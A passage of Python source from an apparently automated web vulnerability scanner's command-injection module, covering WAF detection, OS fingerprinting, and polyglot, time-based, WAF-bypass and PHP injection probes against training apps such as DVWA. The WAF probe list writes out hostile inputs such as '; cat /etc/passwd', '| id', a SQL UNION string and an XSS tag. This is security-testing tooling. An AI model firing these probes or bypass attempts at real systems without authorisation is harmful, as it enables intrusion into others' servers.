        self.findings = []
        self._progressive_findings = []  # Reset for each scan
        self._scan_start_time = time.time()  # TIMEOUT-FIX 2026-02-18

        base_url = resolve_base_url(host)

        # GAP-A2 FIX 2026-02-18: Use "endpoints" key (what full_scanner provides)
        # Bug: Was using "urls" which is always empty!
        if isinstance(asset_data, dict):
            urls = asset_data.get("endpoints", []) or asset_data.get("urls", [])
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])
        if isinstance(asset_data, dict):
            headers_list = asset_data.get("headers", [])

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._asset_data = asset_data  # PERF-FIX 2026-02-20: Store for intelligent payload selection
        self._ctx.log_context_status()
        self._auth_headers = self._ctx.auth_headers
        if self._ctx.has_auth:
            logger.info(f"[CMDI] Using authenticated session ({self._ctx.auth_method})")

        # ENHANCEMENT: Get parameters discovered by arjun for targeted testing
        if isinstance(asset_data, dict):
            tool_discovered_params = asset_data.get("tool_discovered_params") or {}
        if isinstance(asset_data, dict):
            shared_store = asset_data.get("shared_findings_store")

        # NEW: Get endpoint params from metadata discovery (e.g., VulnerableApp /scanner)
        endpoint_params = {}
        vuln_type_hints = {}
        if isinstance(asset_data, dict):
            endpoint_params = asset_data.get("endpoint_params", {})
            vuln_type_hints = asset_data.get("vuln_type_hints", {})

        # ENHANCEMENT 2026-02-20: Add metadata-discovered CMDi endpoints to urls list EARLY
        # This ensures they are tested in Phase 2 (URL parameters), not just Phase 3.6
        cmdi_hint_types = {"COMMAND_INJECTION", "OS_COMMAND_INJECTION", "CMDI", "RCE", "REMOTE_CODE_EXECUTION"}
        cmdi_param_names = {"ip", "ipaddress", "cmd", "command", "exec", "ping", "host", "target"}
        metadata_urls_added = 0

        for ep_url, hints in vuln_type_hints.items():
            # Check if this endpoint has CMDi vulnerability hints
            has_cmdi_hint = any("COMMAND" in h.upper() or "INJECTION" in h.upper() for h in hints)
            if not has_cmdi_hint:
                # Also check param names
                params = endpoint_params.get(ep_url, [])
                has_cmdi_hint = any(p.lower() in cmdi_param_names for p in params)

            if has_cmdi_hint:
                params = endpoint_params.get(ep_url, ["ipaddress", "ip", "cmd", "command"])
                for param in params[:3]:  # Test top 3 params
                    test_url = f"{ep_url}?{param}=127.0.0.1" if "?" not in ep_url else f"{ep_url}&{param}=127.0.0.1"
                    if test_url not in urls:
                        urls.append(test_url)
                        metadata_urls_added += 1

        if metadata_urls_added > 0:
            logger.info(f"[CMDi] Added {metadata_urls_added} metadata-discovered URLs for early testing")

        if tool_discovered_params:
            logger.info(f"[CMDi] Using {len(tool_discovered_params)} parameter sets discovered by arjun")
        
        async with get_scan_client(
            timeout=self.timeout,
            follow_redirects=True,
            custom_headers=self._auth_headers if hasattr(self, "_auth_headers") else None,
        ) as client:

            # Phase 1: WAF Detection
            self.detected_waf = await self._detect_waf(client, base_url, rate_limiter)
            if self.detected_waf:
                logger.info(f"WAF detected: {self.detected_waf.name}")

            # G-05 FIX: Phase 1.5 - Proactive CMDi Endpoint Discovery
            # Try known CMDi-vulnerable paths (DVWA, bWAPP, Mutillidae, etc.)
            discovered_cmdi_urls = await self._discover_cmdi_endpoints(
                client, base_url, rate_limiter
            )
            if discovered_cmdi_urls:
                logger.info(f"[CMDi] Proactively discovered {len(discovered_cmdi_urls)} potential CMDi endpoints")
                urls = list(set(urls + discovered_cmdi_urls))

            # Phase 2: Test URL parameters
            # TIMEOUT-FIX 2026-02-18: Check time limit before each phase
            if not self._check_time_limit():
                return self._build_early_exit_result("time_limit_phase_2")
            await self._test_url_parameters(client, base_url, urls, rate_limiter)
            self._save_progressive_findings()  # TIMEOUT-FIX: Save after each phase

            # Phase 3: Test forms
            # TIMEOUT-FIX 2026-02-18: Check time limit before each phase
            if not self._check_time_limit():
                return self._build_early_exit_result("time_limit_phase_3")
            await self._test_forms(client, base_url, forms, rate_limiter)
            self._save_progressive_findings()  # TIMEOUT-FIX: Save after each phase

            # Phase 3.5: Test arjun-discovered parameters (hidden parameters)
            # TIMEOUT-FIX 2026-02-18: Check time limit before each phase
            if not self._check_time_limit():
                return self._build_early_exit_result("time_limit_phase_3.5")
            arjun_tested = 0
            for endpoint_url, params in tool_discovered_params.items():
                # TIMEOUT-FIX 2026-02-18: Check time limit in loop
                if not self._check_time_limit():
                    break
                if not params:
                    continue

                # Skip if endpoint already has CMDi finding
                if shared_store and shared_store.has_vulnerability(endpoint_url, "command_injection"):
                    logger.debug(f"[CMDi] Skipping {endpoint_url} - already has CMDi finding")
                    continue

                # Build test URLs with discovered parameters
                for param in params[:10]:
                    test_url = f"{endpoint_url}?{param}=test"
                    await self._test_url_parameters(client, base_url, [test_url], rate_limiter)
                    arjun_tested += 1

            if arjun_tested > 0:
                logger.info(f"[CMDi] Tested {arjun_tested} arjun-discovered parameters")
            self._save_progressive_findings()  # TIMEOUT-FIX: Save after each phase

            # Phase 3.6: Test metadata-discovered endpoints (VulnerableApp /scanner, etc.)
            if not self._check_time_limit():
                return self._build_early_exit_result("time_limit_phase_3.6")

            metadata_tested = 0
            # Filter endpoints that have CMDi hints
            cmdi_endpoints = {}
            for endpoint_url, params in endpoint_params.items():
                hints = vuln_type_hints.get(endpoint_url, [])
                # Check if this endpoint has command injection vulnerability hints
                if any("COMMAND" in h.upper() or "INJECTION" in h.upper() for h in hints):
                    cmdi_endpoints[endpoint_url] = params
                elif params:  # Also test endpoints with CMDi-related params
                    cmdi_param_names = {"ip", "ipaddress", "cmd", "command", "exec", "ping", "host", "target"}
                    if any(p.lower() in cmdi_param_names for p in params):
                        cmdi_endpoints[endpoint_url] = params

            if cmdi_endpoints:
                logger.info(f"[CMDi] Testing {len(cmdi_endpoints)} metadata-discovered endpoints")

                for endpoint_url, params in cmdi_endpoints.items():
                    if not self._check_time_limit():
                        break

                    # Skip if endpoint already has CMDi finding
                    if shared_store and shared_store.has_vulnerability(endpoint_url, "command_injection"):
                        continue

                    # Build test URLs with discovered parameters
                    for param in params[:5]:  # Test first 5 params
                        test_url = f"{endpoint_url}?{param}=127.0.0.1"
                        await self._test_url_parameters(client, base_url, [test_url], rate_limiter)
                        metadata_tested += 1

                if metadata_tested > 0:
                    logger.info(f"[CMDi] Tested {metadata_tested} metadata-discovered parameters")
                self._save_progressive_findings()

            # Phase 4: Test headers (if applicable)
            # TIMEOUT-FIX 2026-02-18: Check time limit before each phase
            if not self._check_time_limit():
                return self._build_early_exit_result("time_limit_phase_4")
            await self._test_headers(client, base_url, headers_list, rate_limiter)
            self._save_progressive_findings()  # TIMEOUT-FIX: Save after each phase
        
        # Convert findings to dict format
        findings_dicts = []
        for f in self.findings:
            if f.confidence >= self.MIN_CONFIDENCE_THRESHOLD:
                findings_dicts.append(self._finding_to_dict(f))

        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        try:
            from utils.shared_findings_store import SharedFindingsStore, VulnType
            store = SharedFindingsStore.get_instance()

            for f in findings_dicts:
                if isinstance(f, dict):
                    metadata = f.get("metadata", {})

                    # Cria dict base
                    finding_data = {
                        "type": VulnType.COMMAND_INJECTION,
                        "severity": f.get("severity", "CRITICAL"),
                    }

                    # Adiciona condicionalmente as chaves se data for dict
                    if isinstance(asset_data, dict):
                        finding_data["endpoint"] = f.get("matched_at") or metadata.get("url", "")
                        finding_data["parameter"] = metadata.get("param", "")
                        finding_data["command_output"] = metadata.get("rce_output", "")

                    await store.add_finding(finding_data, module="cmdi")

            if findings_dicts:
                logger.debug(f"[CMDi] Shared {len(findings_dicts)} findings to cross-module store")

        except Exception as e:
            logger.debug(f"[CMDi] Could not share findings: {e}")

        return {
            "module": self.name,
            "version": CMDI_SCANNER_VERSION,
            "findings": findings_dicts,
            "metadata": {
                "detected_waf": self.detected_waf.name if self.detected_waf else None,
                "detected_os": self.detected_os.name if self.detected_os != OSType.UNKNOWN else None,
                "total_tests": len(self.findings),
                "high_confidence_findings": len(findings_dicts),
            }
        }
    
    async def _detect_waf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[WAFType]:
        """Detect WAF by sending malicious-looking requests."""
        # AUDIT 2026-02-07: Use non-destructive payloads that still trigger WAF
        # Avoids SafeAsyncClient blocking (DROP TABLE is in ABSOLUTELY_BLOCKED_PATTERNS)
        test_payloads = [
            "' UNION SELECT 1,2,3--",      # SQL syntax triggers WAF
            "<script>alert(1)</script>",    # XSS triggers WAF
            "; cat /etc/passwd",            # CMDi triggers WAF
            "| id",                         # Pipe injection triggers WAF
        ]
        
        for payload in test_payloads:
            await rate_limiter.acquire()
            try:
                response = await client.get(
                    base_url,
                    params={"test": payload}
                )
                waf = WAFDetector.detect(response)
                if waf:
                    return waf
            except Exception as e:
                logger.debug(f"[CMDI] WAF detection error: {e}")

        return None

    async def _discover_cmdi_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """
        G-05 FIX: Proactively discover command injection endpoints.

        This addresses the 0% detection rate on DVWA, bWAPP, etc. by trying
        known CMDi-vulnerable paths directly rather than relying only on crawler.
        """
        discovered = []

        for path in self.KNOWN_CMDI_PATHS:
            try:
                await rate_limiter.acquire()
                test_url = urljoin(base_url, path)

                # Add common CMDi parameters to test
                # DVWA uses 'ip', bWAPP uses 'target', generic uses 'cmd'
                test_params = ["ip", "target", "host", "cmd", "command", "ping"]

                response = await client.get(test_url, follow_redirects=True)

                # Check if endpoint exists and has form or input
                if response.status_code == 200:
                    text = response.text.lower()

                    # Look for signs this is a command execution page
                    cmdi_indicators = [
                        "ping", "traceroute", "nslookup", "command",
                        "execute", "shell", "dns lookup", "enter an ip",
                        "enter ip address", "host to ping", "target host",
                        "input type=", "<form", "submit"
                    ]

                    if any(indicator in text for indicator in cmdi_indicators):
                        # Build URLs with test parameters
                        for param in test_params:
                            param_url = f"{test_url}?{param}=127.0.0.1"
                            discovered.append(param_url)

                        logger.debug(f"[CMDi] Found potential CMDi endpoint: {path}")

            except (httpx.RequestError, httpx.TimeoutException) as e:
                logger.debug(f"[CMDi] Endpoint discovery error for {path}: {e}")
                continue

        return discovered

    async def _fingerprint_os(
        self,
        client: httpx.AsyncClient,
        url: str,
        param_name: str,
        original_value: str,
        rate_limiter: RateLimiter,
    ) -> OSType:
        """Attempt to fingerprint the target OS."""
        # Test common indicators first
        parsed = urlparse(url)
        
        for os_type, payloads in self.OS_DETECTION_PAYLOADS.items():
            # FN-C2 FIX: Test more payloads per OS (was [:1], now [:3])
            for payload, indicators in payloads[:3]:
                await rate_limiter.acquire()
                
                test_params = {param_name: original_value + payload}
                query = urlencode(test_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url)
                    content = response.text
                    
                    for indicator in indicators:
                        if indicator in content:
                            return os_type
                except Exception as e:
                    logger.debug(f"[CMDI] OS fingerprint error: {e}")
                    continue

        return OSType.UNKNOWN
    
    async def _test_url_parameters(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test URL parameters for command injection."""
        tested_params = set()
        
        for url in urls[:100]:  # Test more URLs
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test all parameters, prioritizing CMDI_PARAMS
            all_params = list(params.keys())
            # Sort to prioritize known command params
            all_params.sort(key=lambda p: 0 if p.lower() in self.CMDI_PARAMS else 1)
            
            for param_name in all_params:
                param_key = f"{parsed.path}:{param_name}"
                
                if param_key in tested_params:
                    continue
                tested_params.add(param_key)
                
                original_value = params.get(param_name, [""])[0]
                
                # Get baseline
                try:
                    await rate_limiter.acquire()
                    baseline = await client.get(url)
                    baseline_text = baseline.text
                    # Access .elapsed only after response is fully read
                    try:
                        baseline_time = baseline.elapsed.total_seconds() if baseline.elapsed else 0.0
                    except RuntimeError:
                        baseline_time = 0.0
                except (httpx.RequestError, httpx.TimeoutException):
                    continue
                
                # Detect WAF on this endpoint
                endpoint_waf = WAFDetector.detect(baseline)
                
                # Try to fingerprint OS
                if self.detected_os == OSType.UNKNOWN:
                    self.detected_os = await self._fingerprint_os(
                        client, url, param_name, original_value, rate_limiter
                    )
                
                # Phase 1: Polyglot payloads (quick universal test)
                marker = self._generate_marker()
                polyglot_finding = await self._test_polyglot(
                    client, url, parsed, param_name, original_value,
                    marker, baseline_text, base_url, rate_limiter
                )
                if polyglot_finding:
                    self.findings.append(polyglot_finding)
                    continue  # Skip to next param if confirmed
                
                # Phase 2: OS-specific result-based
                os_targets = [self.detected_os] if self.detected_os != OSType.UNKNOWN else [OSType.LINUX, OSType.WINDOWS]
                
                for os_type in os_targets:
                    result_finding = await self._test_result_based(
                        client, url, parsed, param_name, original_value,
                        os_type, baseline_text, base_url, rate_limiter
                    )
                    if result_finding:
                        self.findings.append(result_finding)
                        break
                
                # Phase 3: Time-based blind (if no result-based found)
                if not any(f.parameter == param_name for f in self.findings):
                    for os_type in os_targets:
                        time_finding = await self._test_time_based(
                            client, url, parsed, param_name, original_value,
                            os_type, baseline_time, base_url, rate_limiter
                        )
                        if time_finding:
                            self.findings.append(time_finding)
                            break
                
                # Phase 4: WAF bypass (if WAF detected and no findings)
                if (endpoint_waf or self.detected_waf) and not any(
                    f.parameter == param_name for f in self.findings
                ):
                    waf_to_bypass = endpoint_waf or self.detected_waf
                    bypass_finding = await self._test_waf_bypass(
                        client, url, parsed, param_name, original_value,
                        waf_to_bypass, baseline_text, base_url, rate_limiter
                    )
                    if bypass_finding:
                        self.findings.append(bypass_finding)
                
                # Phase 5: Argument injection
                if param_name.lower() in self.CMDI_PARAMS:
                    arg_finding = await self._test_argument_injection(
                        client, url, parsed, param_name, original_value,
                        baseline_text, base_url, rate_limiter
                    )
                    if arg_finding:
                        self.findings.append(arg_finding)

                # Phase 6: PHP-specific command injection (2026-02-16)
                # For DVWA, bWAPP, Mutillidae and legacy PHP apps
                if not any(f.parameter == param_name for f in self.findings):
                    php_finding = await self._test_php_cmdi(
                        client, url, parsed, param_name, original_value,
                        baseline_text, base_url, rate_limiter
                    )
                    if php_finding:
                        self.findings.append(php_finding)

    async def _test_php_cmdi(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        baseline_text: str,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional["CMDiFinding"]:
        """Test PHP-specific command injection payloads for legacy PHP apps."""
        for payload, indicators in self.PHP_CMDI_PAYLOADS[:25]:  # Test top 25 PHP payloads
            await rate_limiter.acquire()

            test_params = {param_name: original_value + payload}
            query = urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            try:
                response = await client.get(test_url)
                content = response.text

                # Check for command output indicators
                for indicator in indicators:
                    if indicator in content and indicator not in baseline_text:
                        # Check for PHP error patterns (additional confirmation)
                        php_confirmed = False
                        for php_pattern in self.PHP_DETECTION_PATTERNS.get("php_errors", []):
                            if php_pattern.lower() in content.lower():
                                php_confirmed = True
                                break

                        confidence = 90 if php_confirmed else 85

                        return CMDiFinding(
                            url=test_url,
                            parameter=param_name,
                            payload=payload,
                            os_type=OSType.LINUX,
                            shell_type=ShellType.BASH,
                            context=InjectionContext.PHP_FUNCTION,
                            detection_method="php_cmdi",
                            evidence=[
                                f"Payload: {payload}",
                                f"Indicator '{indicator}' found in response",
                                f"PHP context confirmed: {php_confirmed}",
                                "Target appears to be PHP application",
                            ],
                            confidence=confidence,
                        )

            except (httpx.RequestError, httpx.TimeoutException):
                continue

        return None

    async def _test_polyglot(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        marker: str,
        baseline_text: str,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[CMDiFinding]:
        """Test polyglot payloads that work across multiple OS."""
        # 2026-02-20: Use library payloads first, then hardcoded fallback
        library_payloads = self._get_library_cmdi_payloads(max_payloads=10)
        all_payloads = library_payloads + list(self.POLYGLOT_PAYLOADS)
        for payload_template, indicators_template in all_payloads:
            payload = payload_template.format(marker=marker)
            indicators = [i.format(marker=marker) for i in indicators_template]
            
            await rate_limiter.acquire()
            
            test_params = {param_name: original_value + payload}
            query = urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
            
            try:
                start = time.perf_counter()
                response = await client.get(test_url)
                elapsed = time.perf_counter() - start
                content = response.text
                
                for indicator in indicators:
                    if indicator in content and indicator not in baseline_text:
                        # Cross-validate with different payload
                        if await self._cross_validate(
                            client, url, parsed, param_name, original_value,
                            marker, rate_limiter
                        ):
                            return CMDiFinding(
                                url=test_url,
                                parameter=param_name,
                                payload=payload,
                                os_type=OSType.UNKNOWN,  # Polyglot works on multiple
                                shell_type=ShellType.UNKNOWN,
                                context=InjectionContext.DIRECT,
                                detection_method="polyglot_marker",
                                evidence=[
                                    f"Payload: {payload}",
                                    f"Marker '{marker}' found in response",
                                    "Cross-validation: PASSED",
                                ],
                                confidence=95,
                                response_time=elapsed,
                            )
            except Exception as e:
                logger.debug(f"Polyglot test error: {e}")
        
        return None
    
    async def _cross_validate(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        original_marker: str,
        rate_limiter: RateLimiter,
    ) -> bool:
        """Cross-validate finding with different marker."""
        new_marker = self._generate_marker()
        
        for payload_template, indicators_template in self.POLYGLOT_PAYLOADS[:2]:
            payload = payload_template.format(marker=new_marker)
            indicators = [i.format(marker=new_marker) for i in indicators_template]
            
            await rate_limiter.acquire()
            
            test_params = {param_name: original_value + payload}
            query = urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
            
            try:
                response = await client.get(test_url)
                for indicator in indicators:
                    if indicator in response.text and original_marker not in response.text:
                        return True  # New marker found, old not found = confirmed
            except Exception as e:
                logger.debug(f"[CMDI] Confirmation request error: {e}")

        return False

    async def _test_result_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        os_type: OSType,
        baseline_text: str,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[CMDiFinding]:
        """Test result-based command injection."""
        # 2026-02-20: Combine library payloads with hardcoded for better coverage
        library_payloads = self._get_library_cmdi_payloads(max_payloads=15)
        hardcoded_payloads = self.RESULT_PAYLOADS.get(os_type, self.RESULT_PAYLOADS[OSType.LINUX])
        base_payloads = library_payloads + list(hardcoded_payloads)

        # PERF-FIX 2026-02-20: Try intelligent payload selection first
        intelligent_payloads = await self._get_intelligent_payloads(
            category="cmdi",
            endpoint=base_url,
            param_name=param_name,
            max_payloads=30,
            asset_data=getattr(self, '_asset_data', None),
        )

        # Build final payload list: intelligent first, then base payloads
        if intelligent_payloads:
            # intelligent_payloads is list of (payload_str, effectiveness)
            intelligent_strs = [p[0] for p in intelligent_payloads]
            # For intelligent payloads, use generic indicators since they come from learned patterns
            intelligent_with_indicators = [
                (p, ["uid=", "gid=", "root:", "www-data", "Linux", "Windows"])
                for p in intelligent_strs
            ]
            # Merge: intelligent first, then remaining base payloads not already covered
            base_payloads_filtered = [
                (payload, indicators)
                for payload, indicators in base_payloads
                if payload not in intelligent_strs
            ]
            payloads = intelligent_with_indicators + base_payloads_filtered[:20]  # Cap fallback
            logger.debug(f"[CMDi] Using {len(intelligent_strs)} intelligent payloads + {len(base_payloads_filtered[:20])} base")
        else:
            payloads = base_payloads[:50]  # Reasonable limit when no intelligent selection

        # FN-C2 FIX: Test payloads (was unlimited, now capped for performance)
        for payload, indicators in payloads:
            await rate_limiter.acquire()
            
            test_params = {param_name: original_value + payload}
            query = urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
            
            try:
                start = time.perf_counter()
                response = await client.get(test_url)
                elapsed = time.perf_counter() - start
                content = response.text
                
                # Check for indicators
                found_indicators = []
                for indicator in indicators:
                    if indicator in content and indicator not in baseline_text:
                        found_indicators.append(indicator)
                
                if found_indicators:
                    # Determine context
                    context = self._detect_context(payload)

                    # Calculate confidence (returns 0.0-1.0 float)
                    confidence = self._calculate_confidence(
                        found_indicators, payload, content, baseline_text
                    )

                    # FIX 2026-02-16: Use float threshold (0.60) since _calculate_confidence returns float
                    if confidence >= 0.60:  # Lower initial threshold
                        return CMDiFinding(
                            url=test_url,
                            parameter=param_name,
                            payload=payload,
                            os_type=os_type,
                            shell_type=self._detect_shell(payload),
                            context=context,
                            detection_method="result_based",
                            evidence=[
                                f"Payload: {payload}",
                                f"Indicators found: {', '.join(found_indicators)}",
                                f"OS detected: {os_type.name}",
                            ],
                            confidence=confidence,
                            response_time=elapsed,
                        )
                        
            except Exception as e:
                logger.debug(f"Result-based test error: {e}")
        
        return None
    
    async def _test_time_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        os_type: OSType,
        baseline_time: float,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[CMDiFinding]:
        """Test time-based blind command injection."""
        payloads = self.TIME_PAYLOADS.get(os_type, self.TIME_PAYLOADS[OSType.LINUX])

        # THEME-1 FIX: Use configurable delays (include 8s for slow networks)
        for delay in self.blind_delays:
            # THEME-1 FIX: Test more time-based payloads for thorough coverage
            for payload_template, method in payloads[:self.max_time_payloads]:
                payload = payload_template.format(delay=delay)

                await rate_limiter.acquire()

                test_params = {param_name: original_value + payload}
                query = urlencode(test_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                try:
                    start = time.perf_counter()
                    response = await client.get(test_url)
                    elapsed = time.perf_counter() - start

                    # Check for significant delay
                    expected_delay = delay if method != "ping" else delay + 1

                    # THEME-1 FIX: Use configurable tolerance for network jitter
                    if elapsed >= expected_delay * self.delay_tolerance and elapsed > baseline_time + 2:
                        # Verify with different delay
                        if await self._verify_time_based(
                            client, url, parsed, param_name, original_value,
                            payload_template, method, baseline_time, rate_limiter
                        ):
                            return CMDiFinding(
                                url=test_url,
                                parameter=param_name,
                                payload=payload,
                                os_type=os_type,
                                shell_type=self._detect_shell(payload),
                                context=self._detect_context(payload),
                                detection_method="time_based",
                                evidence=[
                                    f"Payload: {payload}",
                                    f"Expected delay: {expected_delay}s",
                                    f"Actual delay: {elapsed:.2f}s",
                                    f"Baseline: {baseline_time:.2f}s",
                                    "Verification: PASSED",
                                ],
                                confidence=90,
                                response_time=elapsed,
                                baseline_time=baseline_time,
                            )
                            
                except httpx.TimeoutException:
                    # Timeout could indicate successful injection
                    return CMDiFinding(
                        url=test_url,
                        parameter=param_name,
                        payload=payload,
                        os_type=os_type,
                        shell_type=self._detect_shell(payload),
                        context=self._detect_context(payload),
                        detection_method="timeout",
                        evidence=[
                            f"Payload: {payload}",
                            f"Request timed out",
                            f"Expected delay: {delay}s",
                        ],
                        confidence=75,
                        baseline_time=baseline_time,
                    )
                    
                except Exception as e:
                    logger.debug(f"Time-based test error: {e}")
        
        return None
    
    async def _verify_time_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        payload_template: str,
        method: str,
        baseline_time: float,
        rate_limiter: RateLimiter,
    ) -> bool:
        """Verify time-based injection with different delay."""
        # Test with shorter delay
        short_delay = 2
        payload_short = payload_template.format(delay=short_delay)
        
        await rate_limiter.acquire()
        
        test_params = {param_name: original_value + payload_short}
        query = urlencode(test_params)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
        
        try:
            start = time.perf_counter()
            await client.get(test_url)
            elapsed = time.perf_counter() - start
            
            expected = short_delay if method != "ping" else short_delay + 1
            
            # Should be faster than first test but still delayed
            if expected * 0.7 <= elapsed <= expected * 1.5:
                return True
                
        except Exception as e:
            logger.debug(f"[CMDI] Time-based test error: {e}")

        return False

    async def _test_waf_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        waf_type: WAFType,
        baseline_text: str,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[CMDiFinding]:
        """Test WAF bypass payloads."""
        bypass_payloads = self.WAF_BYPASS_PAYLOADS.get(
            waf_type,
            self.WAF_BYPASS_PAYLOADS.get(WAFType.MODSECURITY, [])
        )
        
        for payload, indicators in bypass_payloads:
            # Try original and mutated versions
            payload_variants = [payload] + PayloadMutator.get_all_mutations(payload)
            
            for variant in payload_variants[:5]:
                await rate_limiter.acquire()
                
                test_params = {param_name: original_value + variant}
                query = urlencode(test_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url)
                    
                    # Check if WAF blocked
                    if response.status_code in [403, 406, 429, 503]:
                        continue  # WAF blocked, try next
                    
                    # Check for indicators
                    for indicator in indicators:
                        if indicator in response.text and indicator not in baseline_text:
                            return CMDiFinding(
                                url=test_url,
                                parameter=param_name,
                                payload=variant,
                                os_type=OSType.LINUX,  # Most bypass payloads are Linux
                                shell_type=ShellType.BASH,
                                context=self._detect_context(variant),
                                detection_method="waf_bypass",
                                evidence=[
                                    f"WAF: {waf_type.name}",
                                    f"Bypass payload: {variant}",
                                    f"Indicator found: {indicator}",
                                ],
                                confidence=85,
                                waf_detected=waf_type,
                                waf_bypassed=True,
                            )
                            
                except Exception as e:
                    logger.debug(f"WAF bypass test error: {e}")
        
        return None
    
    async def _test_argument_injection(
        self,
        client: httpx.AsyncClient,
        url: str,
        parsed: Any,
        param_name: str,
        original_value: str,
        baseline_text: str,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[CMDiFinding]:
        """Test argument injection attacks."""
        for payload, indicators in self.ARGUMENT_PAYLOADS[:8]:
            await rate_limiter.acquire()
            
            # Test with original value + space + payload
            test_params = {param_name: f"{original_value} {payload}"}
            query = urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
            
            try:
                response = await client.get(test_url)
                
                # Check for help/version indicators
                for indicator in indicators:
                    if indicator.lower() in response.text.lower() and indicator.lower() not in baseline_text.lower():
                        return CMDiFinding(
                            url=test_url,
                            parameter=param_name,
                            payload=payload,
                            os_type=OSType.UNKNOWN,
                            shell_type=ShellType.UNKNOWN,
                            context=InjectionContext.ARGUMENT,
                            detection_method="argument_injection",
                            evidence=[
                                f"Payload: {payload}",
                                f"Indicator found: {indicator}",
                                "Command arguments can be manipulated",
                            ],
                            confidence=70,
                        )
                        
            except Exception as e:
                logger.debug(f"Argument injection test error: {e}")
        
        return None
    
    async def _test_forms(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        forms: list[dict],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test forms for command injection."""
        for form in forms[:30]:
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            
            form_url = urljoin(base_url, action) if action else base_url
            
            # Find command-prone inputs
            for inp in inputs:
                input_name = inp.get("name", "")
                if not input_name:
                    continue
                
                # Test if this looks like a command parameter
                is_cmd_param = any(s in input_name.lower() for s in self.CMDI_PARAMS)
                
                if not is_cmd_param:
                    continue
                
                # Get baseline
                try:
                    await rate_limiter.acquire()
                    baseline_data = {i.get("name", ""): i.get("value", "test") for i in inputs if i.get("name")}

                    if method == "POST":
                        baseline = await client.post(form_url, data=baseline_data)
                    else:
                        baseline = await client.get(form_url, params=baseline_data)

                    baseline_text = baseline.text
                    # Access .elapsed only after response is fully read
                    try:
                        baseline_time = baseline.elapsed.total_seconds() if baseline.elapsed else 0.0
                    except RuntimeError:
                        baseline_time = 0.0
                except (httpx.RequestError, httpx.TimeoutException):
                    continue
                
                # Test polyglot first
                # 2026-02-20: Use library payloads with fallback to hardcoded
                marker = self._generate_marker()
                form_polyglots = self._get_library_cmdi_payloads(max_payloads=3)
                for payload_template, indicators_template in form_polyglots[:2]:
                    payload = payload_template.format(marker=marker)
                    indicators = [i.format(marker=marker) for i in indicators_template]
                    
                    await rate_limiter.acquire()
                    
                    form_data = baseline_data.copy()
                    form_data[input_name] = f"test{payload}"
                    
                    try:
                        if method == "POST":
                            response = await client.post(form_url, data=form_data)
                        else:
                            response = await client.get(form_url, params=form_data)
                        
                        for indicator in indicators:
                            if indicator in response.text and indicator not in baseline_text:
                                self.findings.append(CMDiFinding(
                                    url=form_url,
                                    parameter=f"form:{input_name}",
                                    payload=payload,
                                    os_type=OSType.UNKNOWN,
                                    shell_type=ShellType.UNKNOWN,
                                    context=InjectionContext.DIRECT,
                                    detection_method="form_polyglot",
                                    evidence=[
                                        f"Form: {form_url}",
                                        f"Input: {input_name}",
                                        f"Method: {method}",
                                        f"Marker found: {marker}",
                                    ],
                                    confidence=90,
                                ))
                                break
                                
                    except Exception as e:
                        logger.debug(f"Form test error: {e}")
                
                # Test time-based for forms
                # THEME-1 FIX: Use configurable delays and more payloads
                for delay in self.blind_delays:
                    for payload_template, _ in self.TIME_PAYLOADS.get(OSType.LINUX, [])[:self.max_form_time_payloads]:
                        payload = payload_template.format(delay=delay)

                        await rate_limiter.acquire()

                        form_data = baseline_data.copy()
                        form_data[input_name] = f"test{payload}"

                        try:
                            start = time.perf_counter()
                            if method == "POST":
                                await client.post(form_url, data=form_data)
                            else:
                                await client.get(form_url, params=form_data)
                            elapsed = time.perf_counter() - start

                            # THEME-1 FIX: Use configurable tolerance
                            if elapsed >= delay * self.delay_tolerance and elapsed > baseline_time + 2:
                                self.findings.append(CMDiFinding(
                                    url=form_url,
                                    parameter=f"form:{input_name}",
                                    payload=payload,
                                    os_type=OSType.LINUX,
                                    shell_type=ShellType.BASH,
                                    context=InjectionContext.DIRECT,
                                    detection_method="form_time_based",
                                    evidence=[
                                        f"Form: {form_url}",
